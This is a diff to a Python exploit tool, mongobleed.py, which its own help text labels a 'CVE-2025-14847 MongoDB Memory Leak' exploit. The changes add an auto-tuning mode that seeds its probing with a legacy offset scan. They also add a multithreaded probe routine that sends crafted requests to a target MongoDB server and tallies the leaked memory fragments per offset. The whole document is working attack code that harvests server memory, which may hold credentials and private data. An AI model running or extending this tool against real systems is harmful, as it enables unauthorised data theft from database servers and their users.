@@ -144,10 +144,21 @@ def main():
         "  python3 mongobleed.py --host <target> --auto --auto-min 128KB --auto-max 5MB\n"
         "  python3 mongobleed.py --host <target> --auto --auto-samples 12\n"
         "  python3 mongobleed.py --host <target> --auto --auto-mode size\n"
+        "  python3 mongobleed.py --host <target> --auto --auto-legacy\n"
         "  python3 mongobleed.py --host <target> --dump 10MB\n"
         "  python3 mongobleed.py --host <target> --dump 10MB --dump-window 2048\n"
         "  python3 mongobleed.py --host <target> --dump 512KB --preview-bytes 4096 --decode\n"
         "  python3 mongobleed.py --host <target> --min-offset 100 --max-offset 20000\n"
+        "\nDefaults (when only --loop/--decode are set):\n"
+        "  --host localhost\n"
+        "  --port 27017\n"
+        "  --min-offset 20\n"
+        "  --max-offset 1048576\n"
+        "  --buffer-extra 500\n"
+        "  --timeout 2.0\n"
+        "  --workers max(4, cpu*10)\n"
+        "  --preview-bytes 80\n"
+        "  --max-empty-passes 1\n"
     )
     parser = argparse.ArgumentParser(
         description='CVE-2025-14847 MongoDB Memory Leak',
@@ -168,6 +179,8 @@ def main():
     parser.add_argument('--dump', help='Target claimed size, e.g. 10MB or 512KB')
     parser.add_argument('--dump-window', type=int, default=0, help='Probe +/- N bytes around dump size (0=auto)')
     parser.add_argument('--auto', action='store_true', help='Auto-tune dump size/window for best yield')
+    parser.add_argument('--auto-legacy', action='store_true',
+                        help='Seed auto-tune with a legacy scan to find hot offsets')
     parser.add_argument('--auto-min', default='64KB', help='Min size for auto sweep (e.g., 64KB)')
     parser.add_argument('--auto-max', default='10MB', help='Max size for auto sweep (e.g., 10MB)')
     parser.add_argument('--auto-samples', type=int, default=8, help='Samples per config in auto sweep')
@@ -387,6 +400,41 @@ def main():
                         leak_bytes += len(data)
         return leaks_found, leak_bytes, empty_count
 
+    def run_probe_offsets_with_meta(offsets, buffer_extra):
+        leaks_found = set()
+        leak_bytes = 0
+        per_offset_bytes = {}
+        empty_count = 0
+
+        def probe_with_offset(off):
+            response, ok = send_probe_with_status(
+                args.host,
+                args.port,
+                off,
+                off + buffer_extra,
+                args.timeout,
+            )
+            return off, response, ok
+
+        with concurrent.futures.ThreadPoolExecutor(
+            max_workers=min(args.workers, len(offsets))
+        ) as executor:
+            futures = [executor.submit(probe_with_offset, off) for off in offsets]
+            for future in concurrent.futures.as_completed(futures):
+                off, response, ok = future.result()
+                if not ok:
+                    empty_count += 1
+                leaks = extract_leaks(response)
+                offset_bytes = 0
+                for data in leaks:
+                    offset_bytes += len(data)
+                    if data not in leaks_found:
+                        leaks_found.add(data)
+                        leak_bytes += len(data)
+                if offset_bytes:
+                    per_offset_bytes[off] = offset_bytes
+        return leaks_found, leak_bytes, empty_count, per_offset_bytes
+
     if args.auto:
         try:
             min_size = parse_size(args.auto_min)
@@ -402,10 +450,18 @@ def main():
         args.dump_window = 0
 
         args.timeout = min(args.timeout, args.auto_timeout_max)
+        sizes = None
         console.print("[bold cyan][*][/bold cyan] Auto preflight: validating target...")
         try:
-            legacy_offsets = list(range(20, 8192))
-            legacy_leaks, legacy_bytes, _ = run_probe_offsets(legacy_offsets, args.buffer_extra)
+            legacy_max = 8192
+            legacy_step = 1
+            if args.auto_legacy:
+                legacy_max = min(262144, max_size)
+                legacy_step = max(1, (legacy_max - 20) // 2048)
+            legacy_offsets = list(range(20, legacy_max, legacy_step))
+            legacy_leaks, legacy_bytes, _, per_offset_bytes = run_probe_offsets_with_meta(
+                legacy_offsets, args.buffer_extra
+            )
         except KeyboardInterrupt:
             console.print("[bold yellow][!][/bold yellow] Interrupted during preflight.")
             return
@@ -419,13 +475,28 @@ def main():
             f"{len(legacy_leaks)} fragments, {legacy_bytes} bytes"
         )
 
-        sizes = []
-        size = min_size
-        while size <= max_size:
-            sizes.append(size)
-            size *= 2
-        if sizes[-1] != max_size:
-            sizes.append(max_size)
+        if args.auto_legacy and per_offset_bytes:
+            best_offset = max(per_offset_bytes.items(), key=lambda x: x[1])[0]
+            best_offset = max(min_size, min(best_offset, max_size))
+            sizes = sorted(
+                {
+                    best_offset,
+                    max(min_size, best_offset // 2),
+                    min(max_size, best_offset * 2),
+                }
+            )
+            console.print(
+                f"[bold cyan][*][/bold cyan] Auto-legacy seed offset: {best_offset}"
+            )
+
+        if sizes is None:
+            sizes = []
+            size = min_size
+            while size <= max_size:
+                sizes.append(size)
+                size *= 2
+            if sizes[-1] != max_size:
+                sizes.append(max_size)
 
         best = None
         console.print("[bold cyan][*][/bold cyan] Auto-tuning dump size/window...")
